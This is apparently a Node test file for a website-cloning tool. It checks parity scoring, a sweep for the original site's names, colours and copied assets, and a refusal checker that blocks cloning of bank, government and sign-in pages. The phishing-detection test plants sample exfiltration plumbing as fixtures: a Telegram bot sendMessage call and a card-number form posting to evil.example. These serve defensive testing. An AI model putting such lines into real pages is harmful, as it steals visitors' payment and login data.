import test from "node:test";
import assert from "node:assert/strict";
import { createHash } from "node:crypto";
import { score, parseCsv } from "../skills/remake/tools/parity.mjs";
import { sweep } from "../skills/remake/tools/sweep.mjs";
import { check } from "../skills/remake/tools/refuse.mjs";
import { put, tmp } from "./helpers.mjs";

const CSV = `feature,area,priority,original,clone,notes
Book a slot,booking,must,yes,yes,
Reschedule,booking,must,yes,partial,"link works, form does not"
Team round robin,teams,should,yes,no,
Dark mode,theme,could,yes,yes,
Partner marketplace,network,could,yes,skip,their network
Flat pricing,billing,should,no,yes,we added this
`;

test("parity weights must 3, should 2, could 1 and counts partial as half", () => {
  const r = score(CSV);
  // earned 3 + 1.5 + 0 + 1 = 5.5 of possible 3 + 3 + 2 + 1 = 9
  assert.equal(r.score, 61.1);
  assert.equal(r.shippable, false);
  assert.deepEqual(r.mustNotDone, ["Reschedule"]);
  assert.equal(r.skipped, 1);
  assert.equal(r.added, 1);
  assert.equal(r.missing[0].feature, "Reschedule", "must-haves come first in the missing list");
});

test("parity is shippable when every must-have is yes", () => {
  const r = score("feature,area,priority,original,clone\nA,x,must,yes,yes\nB,x,could,yes,no\n");
  assert.equal(r.shippable, true);
});

test("csv cells with commas and quotes are read whole", () => {
  const rows = parseCsv('a,b\n"one, two","say ""hi"""\n');
  assert.deepEqual(rows[1], ["one, two", 'say "hi"']);
});

test("parity rejects a row with a priority it does not know", () => {
  assert.throws(() => score("feature,priority,original,clone\nA,urgent,yes,yes\n"), /priority/);
});

test("sweep finds the original's name, domain and colours in code and file names", (t) => {
  const dir = tmp(t);
  put(dir, "src/AcmeEmbed.tsx", "export const a = 1;\n");
  put(dir, "src/page.tsx", 'const t = "Welcome to Acme Inc";\nconst d = "https://cdn.acme.com/x.png";\n');
  put(dir, "src/style.css", ".a { color: #006BFF; }\n.b { border-color: rgb(0, 107, 255); }\n");
  const findings = sweep(dir, { avoid: ["Acme", "Acme Inc"], domains: ["acme.com"], colors: ["#006bff"] });
  const kinds = new Set(findings.map((f) => f.kind));
  assert.ok(kinds.has("name"));
  assert.ok(kinds.has("domain"));
  assert.ok(kinds.has("color"));
  assert.ok(findings.some((f) => f.kind === "name" && f.file === "src/AcmeEmbed.tsx"), "file name caught");
  assert.ok(findings.filter((f) => f.kind === "color").length >= 2, "hex and rgb forms both caught");
});

test("sweep finds an image or font copied from the original by its fingerprint", (t) => {
  const dir = tmp(t);
  const bytes = Buffer.from("not really a logo, but the same bytes");
  put(dir, "public/logo.png", bytes);
  put(dir, "public/mine.png", Buffer.from("something else"));
  const sha256 = createHash("sha256").update(bytes).digest("hex");
  const findings = sweep(dir, {}, { fingerprints: [{ sha256 }] });
  assert.equal(findings.length, 1);
  assert.equal(findings[0].kind, "asset");
  assert.equal(findings[0].file, "public/logo.png");
});

test("sweep ignores node_modules and the .remake working folder", (t) => {
  const dir = tmp(t);
  put(dir, "node_modules/x/index.js", "Acme Acme Acme");
  put(dir, ".remake/recon.md", "Acme notes");
  put(dir, "index.html", "<h1>Mine</h1>");
  assert.deepEqual(sweep(dir, { avoid: ["Acme"] }), []);
});

test("sweep flags the usual phishing plumbing in any mode", (t) => {
  const dir = tmp(t);
  put(dir, "a.js", "fetch('https://api.telegram.org/bot123:abc/sendMessage')\n");
  put(dir, "b.html", '<form action="https://evil.example/collect"><input autocomplete="cc-number"></form>\n');
  put(dir, "c.html", '<form action="/login"></form>\n');
  const findings = sweep(dir, { avoid: ["Acme"] }, { safetyOnly: true });
  assert.ok(findings.every((f) => f.kind === "safety"));
  assert.ok(findings.some((f) => /Telegram/.test(f.detail)));
  assert.ok(findings.some((f) => /another site/.test(f.detail)));
  assert.ok(findings.some((f) => /card/.test(f.detail)));
  assert.ok(!findings.some((f) => f.file === "c.html"), "a form that posts to this app is fine");
});

test("sweep does not check the original's name in safety-only mode", (t) => {
  const dir = tmp(t);
  put(dir, "page.html", "<p>Acme</p>");
  assert.deepEqual(sweep(dir, { avoid: ["Acme"] }, { safetyOnly: true }), []);
});

test("refuse: ordinary products are ok", () => {
  assert.equal(check("https://notion.so", { text: "a notes app" }).level, "ok");
  assert.equal(check("https://cal.com", { text: "a scheduling tool" }).level, "ok");
});

test("refuse: banks, payments, governments and identity pages are never built", () => {
  assert.equal(check("https://netbanking.hdfcbank.com").level, "refuse");
  assert.equal(check("https://www.chase.com").level, "refuse");
  assert.equal(check("https://www.irs.gov/refunds").level, "refuse");
  assert.equal(check("https://accounts.google.com/signin").level, "refuse");
  assert.equal(check("https://services.example.gov.in").level, "refuse");
  assert.equal(check("example.com", { text: "copy the sign in page of my bank" }).level, "refuse");
  assert.equal(check("example.com", { text: "a fake login that looks exactly like the real one" }).level, "refuse");
});

test("refuse: money, identity and health topics need proof of ownership", () => {
  assert.equal(check("https://example.com", { text: "a loan app with KYC" }).level, "review");
  assert.equal(check("https://example.com", { text: "patient portal" }).level, "review");
});

test("refuse: big consumer products are allowed with a note, never exact", () => {
  const r = check("https://www.instagram.com", { text: "a photo sharing app" });
  assert.equal(r.level, "ok");
  assert.match(r.notes.join(" "), /match mode only/);
  assert.match(r.notes.join(" "), /sign-in page/);
});

test("refuse: proved ownership of the site lifts a sensitive-topic review", (t) => {
  const dir = tmp(t);
  put(dir, "ownership.json", JSON.stringify({ kind: "live", host: "myloans.example", verified: true }));
  assert.equal(check("https://myloans.example", { text: "loan app", dir }).level, "ok");
  assert.equal(check("https://other.example", { text: "loan app", dir }).level, "review");
});
